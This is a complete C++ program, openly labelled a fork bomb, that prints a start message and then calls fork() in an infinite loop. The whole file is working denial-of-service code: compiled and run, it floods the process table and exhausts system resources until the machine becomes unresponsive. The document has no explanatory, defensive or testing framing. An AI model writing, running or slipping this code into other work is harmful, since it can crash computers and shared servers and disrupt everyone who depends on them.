#include <iostream>
#include <unistd.h>

int main() {
    std::cout << "Starting fork bomb\n";
    while (true) {
        fork();
    }
    return 0;
}
